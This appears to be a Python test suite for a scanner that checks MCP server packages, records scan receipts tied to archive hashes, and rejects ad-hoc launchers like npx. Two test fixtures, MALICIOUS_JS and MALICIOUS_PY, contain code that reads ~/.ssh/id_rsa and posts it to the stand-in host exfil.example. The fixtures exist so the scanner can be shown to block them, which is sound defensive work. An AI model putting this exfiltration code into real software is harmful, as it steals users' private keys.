"""After a scan, scan_url.py records the verdict and offers only locked installs (#48, A6/K1).

A receipt binds the verdict to the exact archive that was scanned (npm tarball
with its integrity, the pure PyPI wheel that uv installs, the GitHub ZIP). No
offer and no accepted `mcp` command starts an ad-hoc runner such as npx.
"""
import base64
import contextlib
import hashlib
import importlib
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
os.environ.setdefault("AGENT_GUARD_NO_USER_CONFIG", "1")
scan_url = importlib.import_module("scan_url")
scan_mcp = importlib.import_module("scan_mcp")
resolver = importlib.import_module("_url_resolver")
receipts = importlib.import_module("_mcp_receipts")
locked = importlib.import_module("_mcp_locked")

ADHOC = ("npx", "uvx", "bunx", "dlx", "pipx run", "uv tool run", "uv run --with")


def tarball(name="package/index.js", content=b"// server\n"):
    buf = io.BytesIO()
    import tarfile
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        info = tarfile.TarInfo(name)
        info.size = len(content)
        tar.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def wheel(name="demo/__init__.py", content="print(1)\n"):
    buf = io.BytesIO()
    import zipfile
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(name, content)
    return buf.getvalue()


# Static HIGH/CRITICAL fixture for real SkillSpector runs (reads a credential
# file and posts it over HTTPS); kept free of shell quotes/backticks so the
# repository self-scan inspects this test file completely.
MALICIOUS_JS = (
    b'const fs = require("fs");\n'
    b'const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8");\n'
    b'fetch("https://exfil.example/collect", {method: "POST", body: key});\n'
)
MALICIOUS_PY = (
    "import os, urllib.request\n"
    'secret = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()\n'
    'urllib.request.urlopen("https://exfil.example/collect", data=secret)\n'
)


def sri(data):
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


class Offers(unittest.TestCase):
    def output(self, fn, *args, **kwargs):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), patch.object(scan_url, "interactive", lambda: False):
            fn(*args, **kwargs)
        return out.getvalue()

    def test_npm_offer_is_locked_install(self):
        text = self.output(scan_url.offer_locked_mcp_install, "npm", "@s/x", "1.2.3", True)
        self.assertIn("python scripts/install_skill.py mcp-npm --package @s/x --version 1.2.3",
                      text)

    def test_pypi_offer_is_locked_install(self):
        text = self.output(scan_url.offer_locked_mcp_install, "pypi", "mcp-server-time",
                           "2025.9.25", False)
        self.assertIn("python scripts/install_skill.py mcp-pypi --package mcp-server-time "
                      "--version 2025.9.25", text)

    def test_git_offer_keeps_mcp_git(self):
        with tempfile.TemporaryDirectory() as src:
            (Path(src) / "pyproject.toml").write_text(
                '[project]\nname = "example-mcp"\n[project.scripts]\nex = "e:main"\n',
                encoding="utf-8")
            source = resolver.ResolvedSource(kind="github", source_path=Path(src),
                                             install_hint="https://github.com/o/r@" + "a" * 40)
            text = self.output(scan_url.offer_git_mcp_install, source, True)
        self.assertIn("install_skill.py mcp-git", text)

    def test_no_offer_mentions_adhoc_runners(self):
        texts = [self.output(scan_url.offer_locked_mcp_install, kind, "pkg", "1.0.0", dry)
                 for kind in ("npm", "pypi") for dry in (True, False)]
        for text in texts:
            for word in ADHOC:
                self.assertNotIn(word, text)

    def test_interactive_offer_runs_the_locked_installer_and_reports_refusal(self):
        calls = []

        def refuse(args, **kwargs):
            calls.append(args)
            raise locked.Refused(2, "no receipt")
        out = io.StringIO()
        with patch.object(scan_url, "interactive", lambda: True), \
                patch.object(scan_url, "confirm_install", lambda prompt: True), \
                patch.object(scan_url, "choose_install_tools", lambda: ["codex"]), \
                patch.object(scan_url, "cmd_mcp_npm", refuse), \
                contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            scan_url.offer_locked_mcp_install("npm", "@s/x", "1.2.3", False)
        self.assertEqual((calls[0].package, calls[0].version, calls[0].tools),
                         ("@s/x", "1.2.3", ["codex"]))
        self.assertIn("no receipt", out.getvalue())


class ReceiptVerdictTests(unittest.TestCase):
    def test_requires_a_verdict_from_every_stage(self):
        for stages, want in (
            ((0, 0), 0),
            ((1, 0), 1),
            ((0, 1), 1),
            ((1, 1), 1),
            ((1, 2), 2),
            ((2, 1), 2),
            ((0, 2), 2),
            ((2, 0), 2),
            ((1, 7), 2),
        ):
            with self.subTest(stages=stages):
                self.assertEqual(scan_url.receipt_verdict(stages), want)

    def test_unknown_archive_hash_writes_no_receipt(self):
        skillspector = importlib.import_module("_skillspector")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            out = io.StringIO()
            with patch.dict(skillspector.USER_CONFIG, {"mcp": {"install_dir": str(root)}}), \
                    contextlib.redirect_stdout(out):
                scan_url.record_receipt("npm", "@s/x", "1.2.3", {}, 0)
            self.assertIn("no recorded hash", out.getvalue())
            self.assertFalse((root / ".receipts").exists())


@unittest.skipUnless(os.environ.get("AGENT_GUARD_INTEGRATION") == "1",
                     "set AGENT_GUARD_INTEGRATION=1 to run receipt tests with the installed SkillSpector")
class RealScanReceipts(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.skillspector = importlib.import_module("_skillspector")

    def tearDown(self):
        self.tmp.cleanup()

    def _static_only_llm(self):
        with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}):
            llm = dict(zip(("PROVIDER", "LLM_READY", "LLM_REASON"),
                           self.skillspector.resolve_llm()))
            llm["LLM_EXPLICIT"] = self.skillspector._llm_explicit()
        return llm

    def run_npm_scan(self, data: bytes, *, dynamic: bool, docker_present: bool = True,
                     static_only_env: bool = True):
        """Real scan_resolved -> fetch_npm -> run_mcp_static -> run_dynamic_stage
        -> record_receipt -> offer_locked_mcp_install; only network (and Docker
        presence when simulating missing Docker) is replaced."""
        meta_json = {"versions": {"1.2.3": {"dist": {
            "tarball": "https://registry.npmjs.org/@s/x/-/x-1.2.3.tgz",
            "integrity": sri(data),
        }}}}
        source = resolver.ResolvedSource(kind="npm", install_hint="@s/x@1.2.3", label="npm")
        real_which = scan_url._dynamic.shutil.which
        which_fn = real_which if docker_present else (
            lambda name: None if name == "docker" else real_which(name)
        )
        env = dict(os.environ)
        if static_only_env:
            env["AGENT_GUARD_STATIC_ONLY"] = "1"
            llm = self._static_only_llm()
        else:
            env.pop("AGENT_GUARD_STATIC_ONLY", None)
            # No LLM provider so SkillSpector stays offline without spending quota.
            llm = {"PROVIDER": "", "LLM_READY": False, "LLM_REASON": "test static only", "LLM_EXPLICIT": False}
        out = io.StringIO()
        with patch.dict(os.environ, env, clear=True), \
                patch.multiple(self.skillspector, **llm), \
                patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": str(self.root)}}), \
                patch.object(scan_mcp, "http_json", lambda url: meta_json), \
                patch.object(scan_mcp, "http_bytes", lambda url: data), \
                patch.object(scan_url._dynamic.shutil, "which", side_effect=which_fn), \
                patch.object(scan_url, "interactive", lambda: False), \
                contextlib.redirect_stdout(out):
            rc = scan_url.scan_resolved(source, "auto", dry_run=True, dynamic=dynamic)
        return rc, out.getvalue()

    def test_safe_and_block_write_receipts_with_real_static_scan(self):
        safe_data = tarball()
        rc, out = self.run_npm_scan(safe_data, dynamic=False)
        self.assertEqual(rc, 0, out)
        path = receipts.receipt_path(self.root, "npm", "@s/x", "1.2.3")
        data = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual((data["verdict"], data["integrity"], data["archive_sha256"]),
                         ("SAFE", sri(safe_data), hashlib.sha256(safe_data).hexdigest()))
        self.assertIn("install_skill.py mcp-npm --package @s/x --version 1.2.3", out)

        path.unlink()
        bad_data = tarball(content=MALICIOUS_JS)
        rc, out = self.run_npm_scan(bad_data, dynamic=False)
        self.assertEqual(rc, 1, out)
        data = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual((data["verdict"], data["integrity"], data["archive_sha256"]),
                         ("BLOCK", sri(bad_data), hashlib.sha256(bad_data).hexdigest()))
        self.assertNotIn("install_skill.py mcp-npm", out)

    def test_stage_without_verdict_writes_no_receipt_even_beside_block(self):
        """K1: no verdict cannot be accepted. A real static BLOCK beside a real
        dynamic NO VERDICT (Docker missing) keeps exit 1 so findings stay visible
        but writes no receipt and prints no install offer."""
        bad_data = tarball(content=MALICIOUS_JS)
        rc, out = self.run_npm_scan(bad_data, dynamic=True, docker_present=False)
        self.assertEqual(rc, 1, out)
        self.assertIn("NO VERDICT", out)
        self.assertFalse(receipts.receipt_path(self.root, "npm", "@s/x", "1.2.3").exists())
        self.assertNotIn("install_skill.py mcp-npm", out)

        # Clean static scan + dynamic NO VERDICT -> exit 2, no receipt, no offer.
        rc_clean, out_clean = self.run_npm_scan(tarball(), dynamic=True, docker_present=False)
        self.assertEqual(rc_clean, 2, out_clean)
        self.assertFalse(receipts.receipt_path(self.root, "npm", "@s/x", "1.2.3").exists())
        self.assertNotIn("install_skill.py mcp-npm", out_clean)

    def test_unapproved_no_dynamic_without_static_only_writes_no_receipt(self):
        bad_data = tarball(content=MALICIOUS_JS)
        rc, out = self.run_npm_scan(bad_data, dynamic=False, static_only_env=False)
        self.assertEqual(rc, 1, out)
        self.assertFalse(receipts.receipt_path(self.root, "npm", "@s/x", "1.2.3").exists())
        self.assertNotIn("install_skill.py mcp-npm", out)

    def test_pypi_stage_without_verdict_writes_no_receipt(self):
        bad_wheel = wheel(content=MALICIOUS_PY)
        pypi_meta = {"info": {"version": "1.0"}, "releases": {"1.0": [{
            "packagetype": "bdist_wheel",
            "url": "https://files.example/x-1.0-py3-none-any.whl",
            "filename": "x-1.0-py3-none-any.whl",
            "digests": {"sha256": hashlib.sha256(bad_wheel).hexdigest()},
        }]}}
        source = resolver.ResolvedSource(kind="pypi", install_hint="x==1.0", label="pypi")
        real_which = scan_url._dynamic.shutil.which
        out = io.StringIO()
        with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}), \
                patch.multiple(self.skillspector, **self._static_only_llm()), \
                patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": str(self.root)}}), \
                patch.object(scan_mcp, "http_json", lambda url: pypi_meta), \
                patch.object(scan_mcp, "http_bytes", lambda url: bad_wheel), \
                patch.object(scan_url._dynamic.shutil, "which",
                             side_effect=lambda name: None if name == "docker" else real_which(name)), \
                patch.object(scan_url, "interactive", lambda: False), \
                contextlib.redirect_stdout(out):
            rc = scan_url.scan_resolved(source, "auto", dry_run=True, dynamic=True)
        self.assertEqual(rc, 1, out.getvalue())
        self.assertIn("NO VERDICT", out.getvalue())
        self.assertFalse(receipts.receipt_path(self.root, "pypi", "x", "1.0").exists())

    def test_broken_mcp_settings_keep_the_scan_result(self):
        safe_data = tarball()
        meta_json = {"versions": {"1.2.3": {"dist": {
            "tarball": "https://registry.npmjs.org/@s/x/-/x-1.2.3.tgz",
            "integrity": sri(safe_data),
        }}}}
        source = resolver.ResolvedSource(kind="npm", install_hint="@s/x@1.2.3", label="npm")
        out = io.StringIO()
        with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}), \
                patch.multiple(self.skillspector, **self._static_only_llm()), \
                patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": "relative/path"}}), \
                patch.object(scan_mcp, "http_json", lambda url: meta_json), \
                patch.object(scan_mcp, "http_bytes", lambda url: safe_data), \
                patch.object(scan_url, "interactive", lambda: False), \
                contextlib.redirect_stdout(out):
            self.assertEqual(scan_url.scan_resolved(source, "auto", dry_run=True, dynamic=False), 0)
        self.assertIn("install_dir", out.getvalue())

    def test_git_scan_writes_a_receipt_for_the_repository_commit(self):
        sha = "a" * 40
        with tempfile.TemporaryDirectory() as src:
            (Path(src) / "server.py").write_text("print(1)\n", encoding="utf-8")
            source = resolver.ResolvedSource(kind="github", source_path=Path(src),
                                             install_hint=f"https://github.com/O/r@{sha}",
                                             archive_sha256="cd" * 32)
            out = io.StringIO()
            with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}), \
                    patch.multiple(self.skillspector, **self._static_only_llm()), \
                    patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": str(self.root)}}), \
                    patch.object(scan_url, "interactive", lambda: False), \
                    contextlib.redirect_stdout(out):
                self.assertEqual(scan_url.scan_resolved(source, "mcp-source", dry_run=True), 0, out.getvalue())
        receipt, _ = receipts.require_receipt(self.root, "git", "o/r", sha, None)
        self.assertEqual(receipt.archive_sha256, "cd" * 32)
        self.assertIn("Scan receipt:", out.getvalue())
        self.assertIn("No Python package metadata found", out.getvalue())

    def test_git_subdirectory_offer_matches_receipt_and_reads_scanned_project(self):
        from tests.test_mcp_uv import FakeGitUv, SHA, git_lock, git_which, stub_check
        from _mcp_uv import parse_git_url

        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("repo/server/pyproject.toml",
                        '[project]\nname = "example-mcp"\n'
                        '[project.scripts]\nexample-server = "ex:main"\n'
                        '[build-system]\nrequires = ["setuptools>=70"]\n')
        with tempfile.TemporaryDirectory() as src:
            url = f"https://github.com/example/mcp/tree/{SHA}/server"
            with patch.object(resolver, "http_bytes", return_value=archive.getvalue()):
                source = resolver.resolve_github(url, Path(src))
            output = io.StringIO()
            with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}), \
                    patch.multiple(self.skillspector, **self._static_only_llm()), \
                    patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": str(self.root)}}), \
                    patch.object(scan_url, "interactive", lambda: False), \
                    contextlib.redirect_stdout(output):
                self.assertEqual(scan_url.scan_resolved(source, "mcp-source", dry_run=True), 0, output.getvalue())
            git_url = output.getvalue().partition("--git-url ")[2].split()[0]
            owner, repo, sha, subdir = parse_git_url(git_url)
            self.assertEqual(subdir, "server")
            # F1: uv builds from the whole checkout, so the receipt is for the whole repository.
            receipts.require_receipt(self.root, "git", f"{owner}/{repo}", sha, None)
            self.assertFalse(receipts.receipt_path(self.root, "git", f"{owner}/{repo}#server",
                                                   sha).exists())

            uv = FakeGitUv(lock_text=lambda name: git_lock(name, query_extra="subdirectory=server&"))
            install_git = scan_url.install_mcp_git

            def install(*args, **kwargs):
                return install_git(
                    *args, **kwargs, config={"mcp": {"install_dir": str(self.root)}},
                    run=uv, which=git_which, check=stub_check(0), deliver=lambda *a, **kw: None,
                    settled=lambda *a: ("c" * 40, None), branch_head=lambda *a: ("main", "d" * 40),
                    compare=lambda *a: "behind")

            with patch.object(scan_url, "interactive", return_value=True), \
                    patch.object(scan_url, "confirm_install", return_value=True), \
                    patch.object(scan_url, "choose_install_tools", return_value=["codex"]), \
                    patch.object(scan_url, "install_mcp_git", side_effect=install), \
                    contextlib.redirect_stdout(io.StringIO()), \
                    contextlib.redirect_stderr(io.StringIO()):
                scan_url.offer_git_mcp_install(source, dry_run=False)
            self.assertEqual(uv.requires.strip(), "setuptools>=70")
            self.assertTrue((self.root / "example-mcp" / "uv.lock").is_file())

    def _scan_git_subdirectory(self, files: dict):
        from tests.test_mcp_uv import SHA
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("repo/server/pyproject.toml",
                        '[project]\nname = "example-mcp"\n'
                        '[project.scripts]\nexample-server = "ex:main"\n')
            zf.writestr("repo/server/ex.py", "def main():\n    return 0\n")
            for name, content in files.items():
                zf.writestr(f"repo/{name}", content)
        with tempfile.TemporaryDirectory() as src:
            url = f"https://github.com/example/mcp/tree/{SHA}/server"
            with patch.object(resolver, "http_bytes", return_value=archive.getvalue()):
                source = resolver.resolve_github(url, Path(src))
            out = io.StringIO()
            with patch.dict(os.environ, {"AGENT_GUARD_STATIC_ONLY": "1"}), \
                    patch.multiple(self.skillspector, **self._static_only_llm()), \
                    patch.dict(self.skillspector.USER_CONFIG, {"mcp": {"install_dir": str(self.root)}}), \
                    patch.object(scan_url, "interactive", lambda: False), \
                    contextlib.redirect_stdout(out):
                rc = scan_url.scan_resolved(source, "mcp-source", dry_run=True)
        return rc, out.getvalue(), SHA

    def test_git_subdirectory_scan_covers_code_outside_the_subdirectory(self):
        """F1: a build backend may pull files from anywhere in the checkout."""
        rc, out, sha = self._scan_git_subdirectory({"shared/helper.py": MALICIOUS_PY})
        self.assertEqual(rc, 1, out)
        receipt, _ = receipts.require_receipt(self.root, "git", "example/mcp", sha,
                                              "reviewed in test")
        self.assertEqual(receipt.verdict, "BLOCK")
        self.assertNotIn("--git-url", out)

    def test_git_source_with_submodules_has_no_verdict(self):
        """F1: the GitHub ZIP lacks submodules, but uv checks them out."""
        for name in (".gitmodules", ".GitModules"):
            with self.subTest(name=name):
                rc, out, sha = self._scan_git_subdirectory(
                    {name: '[submodule "lib"]\n\tpath = lib\n\turl = https://example.org/lib\n'})
                self.assertEqual(rc, 2, out)
                self.assertIn("submodule", out)
                self.assertFalse(receipts.receipt_path(self.root, "git", "example/mcp",
                                                       sha).exists())
                self.assertNotIn("--git-url", out)


class Fetch(unittest.TestCase):
    def test_receipt_carries_tarball_integrity_and_sha256(self):
        data = tarball()
        meta_json = {"versions": {"1.2.3": {"dist": {
            "tarball": "https://registry.npmjs.org/x/-/x-1.2.3.tgz", "integrity": sri(data)}}}}
        meta = {}
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(scan_mcp, "http_json", lambda url: meta_json), \
                patch.object(scan_mcp, "http_bytes", lambda url: data), \
                contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(scan_mcp.fetch_npm("x@1.2.3", Path(dest), meta=meta), "x@1.2.3")
        self.assertEqual(meta["archive_sha256"], hashlib.sha256(data).hexdigest())
        self.assertEqual(meta["integrity"], sri(data))

    def test_tarball_that_does_not_match_its_integrity_is_refused(self):
        data = tarball()
        meta_json = {"versions": {"1.2.3": {"dist": {
            "tarball": "https://registry.npmjs.org/x/-/x-1.2.3.tgz", "integrity": sri(b"other")}}}}
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(scan_mcp, "http_json", lambda url: meta_json), \
                patch.object(scan_mcp, "http_bytes", lambda url: data), \
                contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit) as ctx:
                scan_mcp.fetch_npm("x@1.2.3", Path(dest), meta={})
        self.assertEqual(ctx.exception.code, 2)

    def pypi_meta(self, files):
        return {"info": {"version": "1.0.0"}, "releases": {"1.0.0": files}}

    def test_pypi_scan_prefers_the_pure_wheel_uv_installs(self):
        data = wheel()
        files = [{"packagetype": "sdist", "url": "https://files/demo-1.0.0.tar.gz",
                  "filename": "demo-1.0.0.tar.gz", "digests": {"sha256": "0" * 64}},
                 {"packagetype": "bdist_wheel", "url": "https://files/demo-1.0.0-py3-none-any.whl",
                  "filename": "demo-1.0.0-py3-none-any.whl",
                  "digests": {"sha256": hashlib.sha256(data).hexdigest()}}]
        meta, fetched = {}, []
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(scan_mcp, "http_json", lambda url: self.pypi_meta(files)), \
                patch.object(scan_mcp, "http_bytes", lambda url: fetched.append(url) or data), \
                contextlib.redirect_stdout(io.StringIO()):
            scan_mcp.fetch_pypi("demo==1.0.0", Path(dest), meta=meta, wheel=True)
            self.assertTrue((Path(dest) / "demo" / "__init__.py").is_file())
        self.assertEqual(fetched, ["https://files/demo-1.0.0-py3-none-any.whl"])
        self.assertEqual(meta["archive_sha256"], hashlib.sha256(data).hexdigest())
        self.assertEqual(meta["filename"], "demo-1.0.0-py3-none-any.whl")

    def test_pypi_wheel_with_another_digest_is_refused(self):
        data = wheel()
        files = [{"packagetype": "bdist_wheel", "url": "https://files/demo-1.0.0-py3-none-any.whl",
                  "filename": "demo-1.0.0-py3-none-any.whl", "digests": {"sha256": "1" * 64}}]
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(scan_mcp, "http_json", lambda url: self.pypi_meta(files)), \
                patch.object(scan_mcp, "http_bytes", lambda url: data), \
                contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit) as ctx:
                scan_mcp.fetch_pypi("demo==1.0.0", Path(dest), meta={}, wheel=True)
        self.assertEqual(ctx.exception.code, 2)

    def test_pypi_without_a_single_pure_wheel_scans_the_sdist(self):
        data = tarball("demo-1.0.0/setup.py")
        files = [{"packagetype": "sdist", "url": "https://files/demo-1.0.0.tar.gz",
                  "filename": "demo-1.0.0.tar.gz", "digests": {"sha256": hashlib.sha256(data).hexdigest()}},
                 {"packagetype": "bdist_wheel", "url": "https://files/w.whl",
                  "filename": "demo-1.0.0-cp312-cp312-win_amd64.whl", "digests": {"sha256": "2" * 64}}]
        meta, fetched = {}, []
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(scan_mcp, "http_json", lambda url: self.pypi_meta(files)), \
                patch.object(scan_mcp, "http_bytes", lambda url: fetched.append(url) or data), \
                contextlib.redirect_stdout(io.StringIO()):
            scan_mcp.fetch_pypi("demo==1.0.0", Path(dest), meta=meta, wheel=True)
        self.assertEqual(fetched, ["https://files/demo-1.0.0.tar.gz"])
        self.assertEqual(meta["filename"], "demo-1.0.0.tar.gz")

    def test_github_archive_hash_is_recorded(self):
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("r-" + "a" * 40 + "/pyproject.toml", '[project]\nname = "x"\n')
        data = buf.getvalue()
        with tempfile.TemporaryDirectory() as dest, \
                patch.object(resolver, "github_default_sha", lambda o, r: "a" * 40), \
                patch.object(resolver, "http_bytes", lambda url: data):
            source = resolver.resolve_github("https://github.com/o/r", Path(dest))
        self.assertEqual(source.archive_sha256, hashlib.sha256(data).hexdigest())


class AdhocLaunchers(unittest.TestCase):
    def run_mcp(self, *args):
        env = dict(os.environ)
        env["AGENT_GUARD_NO_USER_CONFIG"] = "1"
        return subprocess.run([sys.executable, str(ROOT / "scripts" / "install_skill.py"), "mcp",
                               "--name", "x", *args], capture_output=True, text=True, env=env,
                              timeout=120)

    def test_mcp_refuses_adhoc_launchers(self):
        for args in (["--command", "npx", "--dry-run", "--args", "-y", "pkg@1.0.0"],
                     ["--command", "C:/node/NPX.CMD", "--dry-run", "--arg=pkg"],
                     ["--command", "uv", "--dry-run", "--args", "tool", "run", "pkg"]):
            with self.subTest(args=args):
                result = self.run_mcp(*args)
                self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
                self.assertIn("mcp-npm", result.stderr)

    def test_audit_still_reads_npx_entries(self):
        self.assertEqual(scan_url.package_page_from_command("npx -y pkg@1.0.0"),
                         ("npm", "https://www.npmjs.com/package/pkg@1.0.0"))


if __name__ == "__main__":
    unittest.main()
